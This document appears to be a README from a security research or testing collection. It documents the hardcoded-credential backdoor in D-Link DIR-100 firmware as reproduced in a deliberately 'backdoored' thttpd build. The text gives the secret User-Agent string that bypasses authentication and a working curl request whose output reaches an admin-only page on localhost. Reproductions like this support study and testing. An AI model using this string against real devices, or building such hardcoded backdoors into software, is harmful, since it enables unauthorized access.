# D-Link DIR-100 backdoor
- **Type**: hardcoded credentials
- **Affected versions**: 1.13, Revision A, 2011-09-15


## Backdoor
Setting the `"User-Agent"` header field to `"xmlset_roodkcableoj28840ybtide"` in an HTTP request
allows an attacker to bypass any authentication check.


## Triggering the backdoor
First, we need to start up the HTTP server (e.g., with the _backdoored_ variant):
```console
$ ./backdoored/thttpd -D -u root -p 8080 -d ./example-server
```
Normally, only pages found under `localhost:8080/public/*` should be accessible. However, in a
separate terminal, we can trigger the backdoor via a simple HTTP request:
```console
$ curl -v -A xmlset_roodkcableoj28840ybtide http://localhost:8080/index.html
* Host localhost:8080 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:8080...
* Connected to localhost (::1) port 8080
> GET /index.html HTTP/1.1
> Host: localhost:8080
> User-Agent: xmlset_roodkcableoj28840ybtide
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: thttpd/2.23beta1 26may2002
< Content-Type: text/html; charset=iso-8859-1
< Date: Thu, 12 Dec 2024 08:56:40 GMT
< Last-Modified: Tue, 10 Dec 2024 13:21:22 GMT
< Accept-Ranges: bytes
< Connection: close
< Content-Length: 170
<
<!DOCTYPE html>
<html>
    <head>
        <title> Admin page </title>
    </head>

    <body>
        <p> This page is available to admins only. </p>
    </body>
</html>
* Closing connection
```


## Reference
<https://www.zdnet.com/article/d-link-routers-found-to-contain-backdoor/>
